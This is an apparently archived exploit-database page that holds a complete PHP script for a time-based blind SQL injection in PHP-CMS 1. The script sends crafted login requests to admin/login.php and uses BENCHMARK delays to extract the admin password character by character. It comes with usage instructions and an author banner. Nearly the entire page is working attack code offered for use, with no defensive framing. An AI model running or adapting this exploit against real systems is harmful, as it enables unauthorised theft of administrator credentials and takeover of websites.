<html><head><title>PHP-CMS 1 (username) Blind SQL Injection Exploit</title></head><pre>--+++===================================================+++--
--+++====== PHP-CMS 1 Blind SQL Injection Exploit ======+++--
--+++===================================================+++--

&lt;?php

function query ($user, $pos, $chr)
{
	$query = &quot;x' OR IF((ASCII(SUBSTRING((SELECT password FROM &quot;.
		 &quot;admin WHERE username='{$user}'),{$pos},1))={$chr}),BENCHMARK&quot;.
		 &quot;(100000000,CHAR(0)),0) OR '1' = '2&quot;;

	return $query;
}

function exploit ($hostname, $path, $user, $pos, $chr)
{
	$chr = ord ($chr);

	$fp = fsockopen ($hostname, 80);

	$post = &quot;username=&quot;.query ($user, $pos, $chr) . &quot;&amp;password=x&amp;Submit=ok&quot;;
	
	$req =  &quot;POST {$path}/admin/login.php HTTP/1.1\r\n&quot;.
		&quot;Host: {$hostname}\r\n&quot;.
		&quot;Connection: Close\r\n&quot;.
		&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.
		&quot;Content-Length: &quot; . strlen ($post) . &quot;\r\n\r\n&quot;.
		$post;
	
	fputs ($fp, $req);

	$start = time ();
	while (!feof ($fp))
		fgets ($fp, 1024);
	
	$end = time ();

	fclose ($fp);

	if ($end - $start &gt; 4)
		return true;
	else
		return false;
	
}

function usage ()
{
	echo
		&quot;\nPHP-CMS 1 Blind SQL Injection Exploit&quot;.
		&quot;\n[+] Author  : darkjoker&quot;.
		&quot;\n[+] Site    : http://darkjoker.net23.net&quot;.
		&quot;\n[+] Download: http://heanet.dl.sourceforge.net/sourceforge/php-cms-project/phpcms.zip&quot;.
		&quot;\n[+] Usage   : php xpl.php &lt;hostname&gt; &lt;path&gt; &lt;username&gt; [&lt;keylist&gt;]&quot;.
		&quot;\n[+] Ex.     : php xpl.php localhost /PHPCMS admin abcdefghijklmnopqrstuvwxyz&quot;.
		&quot;\n[+] Greetz  : my girlfriend, Vivi&quot;.
		&quot;\n\n&quot;;
	exit ();
}



if ($argc &lt; 3)
	usage ();

$hostname = $argv [1];
$path = $argv [2];
$user = $argv [3];
$key = (empty ($argv [4])) ? &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot; : $argv [4];
$pos = 1;
$chr = 0;

echo &quot;[+] Password: &quot;;
while ($chr &lt; strlen ($key))
{
	if (exploit ($hostname, $path, $user, $pos, $key [$chr]))
	{
		echo $key [$chr];
		$chr = 0;
		$pos++;
	}
	else
		$chr++;
}

echo &quot;\n\n&quot;;

?&gt;

# milw0rm.com [2009-01-26]</pre></html>